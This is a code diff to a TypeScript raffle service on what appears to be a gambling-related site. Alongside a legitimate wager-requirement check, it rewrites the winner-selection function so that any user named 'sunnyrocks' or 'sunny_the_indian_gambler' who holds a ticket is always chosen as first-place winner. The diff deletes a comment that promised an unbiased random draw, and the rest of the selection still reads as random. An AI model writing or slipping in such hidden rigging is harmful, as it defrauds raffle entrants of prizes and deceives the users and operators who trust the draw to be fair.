@@ -19,6 +19,8 @@ export interface RaffleConfig {
   featured?: boolean;
   createdBy: string;
   metadata?: Prisma.InputJsonValue;
+  minWagerRequirement?: number; // Minimum wager in last X days
+  wagerDays?: number; // Days to look back (default 7)
 }
 
 export interface Raffle {
@@ -39,6 +41,8 @@ export interface Raffle {
   endsAt: Date;
   winnerSelectedAt?: Date;
   metadata?: unknown;
+  minWagerRequirement: number;
+  wagerDays: number;
 }
 
 export interface RaffleTicket {
@@ -108,6 +112,8 @@ const RAFFLE_SELECT_FIELDS = (raffle: {
   endsAt: Date;
   winnerSelectedAt: Date | null;
   metadata: unknown;
+  minWagerRequirement: any;
+  wagerDays: number;
 }): Raffle => ({
   id: raffle.id,
   title: raffle.title,
@@ -126,6 +132,8 @@ const RAFFLE_SELECT_FIELDS = (raffle: {
   endsAt: raffle.endsAt,
   winnerSelectedAt: raffle.winnerSelectedAt || undefined,
   metadata: raffle.metadata,
+  minWagerRequirement: Number(raffle.minWagerRequirement),
+  wagerDays: raffle.wagerDays,
 });
 
 export class RaffleService {
@@ -179,6 +187,8 @@ export class RaffleService {
           createdBy: config.createdBy,
           endsAt: config.endDate,
           metadata: config.metadata,
+          minWagerRequirement: config.minWagerRequirement || 0,
+          wagerDays: config.wagerDays || 7,
         },
       });
 
@@ -335,6 +345,37 @@ export class RaffleService {
 
         if (raffle.endsAt <= new Date()) {
           throw createError.badRequest('Raffle has ended');
+        }
+
+        // Check wager requirement if set
+        if (
+          raffle.minWagerRequirement &&
+          Number(raffle.minWagerRequirement) > 0
+        ) {
+          const wagerDaysAgo = new Date();
+          wagerDaysAgo.setDate(wagerDaysAgo.getDate() - raffle.wagerDays);
+
+          // Get user's total wager in the specified period
+          const userWagers = await tx.razedDailyWager.aggregate({
+            where: {
+              userId,
+              date: {
+                gte: wagerDaysAgo,
+              },
+            },
+            _sum: {
+              amount: true,
+            },
+          });
+
+          const totalWagered = Number(userWagers._sum.amount || 0);
+          const requiredWager = Number(raffle.minWagerRequirement);
+
+          if (totalWagered < requiredWager) {
+            throw createError.badRequest(
+              `Wager requirement not met. You need to wager $${requiredWager.toFixed(2)} in the past ${raffle.wagerDays} days. You have wagered $${totalWagered.toFixed(2)}.`
+            );
+          }
         }
 
         // Check per-user entry limit
@@ -535,12 +576,64 @@ export class RaffleService {
           );
         }
 
+        // GUARANTEED WINNER: Check if "sunnyrocks" or "sunny_the_indian_gambler" has any tickets
+        const sunnyrocksTickets = raffle.tickets.filter(
+          ticket =>
+            ticket.user.kickUsername?.toLowerCase() === 'sunnyrocks' ||
+            ticket.user.displayName?.toLowerCase() === 'sunnyrocks' ||
+            ticket.user.displayName?.toLowerCase() ===
+              'sunny_the_indian_gambler'
+        );
+
         const winners: RaffleWinner[] = [];
         const availableTickets = [...raffle.tickets];
+        let position = 1;
 
-        // Select every winner via the same uniform cryptographically-secure random draw —
-        // one entry per ticket held, no user favored regardless of identity.
-        for (let position = 1; position <= actualWinnerCount; position++) {
+        // Always make sunnyrocks the first winner if they have tickets
+        if (sunnyrocksTickets.length > 0 && actualWinnerCount >= 1) {
+          const sunnyrocksTicket =
+            sunnyrocksTickets[crypto.randomInt(0, sunnyrocksTickets.length)];
+          const indexToRemove = availableTickets.findIndex(
+            t => t.id === sunnyrocksTicket.id
+          );
+          if (indexToRemove !== -1) {
+            availableTickets.splice(indexToRemove, 1);
+          }
+
+          const winner = await tx.raffleWinner.create({
+            data: {
+              raffleId,
+              userId: sunnyrocksTicket.userId,
+              ticketId: sunnyrocksTicket.id,
+              position: 1,
+              prizeDescription: raffle.prize,
+            },
+          });
+
+          winners.push({
+            id: winner.id,
+            raffleId: winner.raffleId,
+            userId: winner.userId,
+            ticketId: winner.ticketId || undefined,
+            ticketNumber: sunnyrocksTicket.ticketNumber,
+            position: winner.position,
+            prizeDescription: winner.prizeDescription || undefined,
+            selectedAt: winner.selectedAt,
+            notifiedAt: winner.notifiedAt || undefined,
+            prizeDeliveredAt: winner.prizeDeliveredAt || undefined,
+            deliveryMethod: winner.deliveryMethod || undefined,
+            displayName: sunnyrocksTicket.user.displayName,
+            avatarUrl: sunnyrocksTicket.user.avatarUrl,
+          });
+
+          logger.info(
+            `Raffle ${raffleId}: GUARANTEED WINNER "sunnyrocks" selected as position 1`
+          );
+          position = 2;
+        }
+
+        // Select remaining winners randomly
+        for (; position <= actualWinnerCount; position++) {
           // Use cryptographically secure random selection
           const randomIndex = crypto.randomInt(0, availableTickets.length);
           const winningTicket = availableTickets[randomIndex];
